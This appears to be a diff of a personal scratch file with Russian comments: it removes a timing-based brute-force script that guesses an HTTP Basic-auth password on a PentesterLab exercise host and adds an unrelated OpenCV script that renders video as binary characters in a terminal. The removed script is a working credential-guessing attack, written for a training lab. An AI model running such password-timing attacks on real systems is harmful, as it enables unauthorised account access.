@@ -33,60 +33,66 @@ python3 -c "from pwn import xor; print(xor(bytes.fromhex('0a1709022f3e2c2619343d
 
 https://pentesterlab.com/exercises/web-for-pentester-II
 
-import requests
+import cv2
 import time
-import string
-import base64
+import os
 
-# Замени IP-адрес на актуальный адрес твоего стенда PentesterLab
-url = "http://192.168.56.102/authentication/example2/"
-username = "hacker"
+def play_binary_video(video_path):
+    # Открываем видеофайл
+    cap = cv2.VideoCapture(video_path)
+    
+    if not cap.isOpened():
+        print("Не удалось открыть видеофайл.")
+        return
 
-# Алфавит для перебора - строчные буквы и цифры
-charset = string.ascii_lowercase + string.digits
-password = ""
+    # Получаем FPS для синхронизации скорости
+    fps = cap.get(cv2.CAP_PROP_FPS)
+    frame_delay = 1.0 / fps if fps > 0 else 1.0 / 30.0
 
-print("Начинаем подбор пароля по времени ответа...")
+    # Очищаем терминал перед началом
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-while True:
-    max_time = 0
-    best_char = ""
-    success = False
-
-    # Перебираем каждый символ из нашего алфавита
-    for char in charset:
-        test_pass = password + char
-        credentials = f"{username}:{test_pass}"
-        
-        # Кодируем строку login:password в base64 для заголовка
-        encoded_creds = base64.b64encode(credentials.encode()).decode()
-
-        headers = {
-            "Authorization": f"Basic {encoded_creds}"
-        }
-
-        # Засекаем точное время до и после запроса
+    while True:
         start_time = time.time()
-        response = requests.get(url, headers=headers)
-        elapsed_time = time.time() - start_time
+        ret, frame = cap.read()
+        
+        if not ret:
+            break  # Видео закончилось
 
-        print(f"Пробуем {test_pass} - время: {elapsed_time:.4f} сек")
+        # Пытаемся получить текущий размер терминала
+        try:
+            term_cols, term_lines = os.get_terminal_size()
+        except OSError:
+            term_cols, term_lines = 80, 24
 
-        # Если получили HTTP 200 - пароль подобран полностью
-        if response.status_code == 200:
-            password = test_pass
-            success = True
-            break
+        # Учитываем высоту шрифта (символы обычно вытянуты по вертикали)
+        # Оставляем 1 строку для избежания сдвига вывода
+        width = term_cols
+        height = term_lines - 1 
 
-        # Фиксируем символ, который заставил сервер "думать" дольше всего
-        if elapsed_time > max_time:
-            max_time = elapsed_time
-            best_char = char
+        # Меняем размер кадра и переводим в градации серого
+        resized = cv2.resize(frame, (width, height))
+        gray = cv2.cvtColor(resized, cv2.COLOR_BGR2GRAY)
 
-    if success:
-        print(f"\nУра! Пароль успешно подобран: {password}")
-        break
+        output = ""
+        for row in gray:
+            for pixel in row:
+                # Порог 127: разделяем на два символа
+                output += "1" if pixel > 127 else "0"
+            output += "\n"
 
-    # Добавляем символ с максимальной задержкой к нашему паролю и идем на следующий круг
-    password += best_char
-    print(f"\n---> Найден новый символ! Текущий вариант: {password}\n")
+        # \033[H возвращает курсор в левый верхний угол (без мерцания)
+        print("\033[H" + output, end="")
+
+        # Высчитываем время для поддержания правильного FPS
+        elapsed = time.time() - start_time
+        sleep_time = frame_delay - elapsed
+        if sleep_time > 0:
+            time.sleep(sleep_time)
+
+    cap.release()
+    print("\nВоспроизведение завершено.")
+
+# Запуск скрипта
+# Укажи путь к своему mp4 файлу
+play_binary_video("video.mp4")
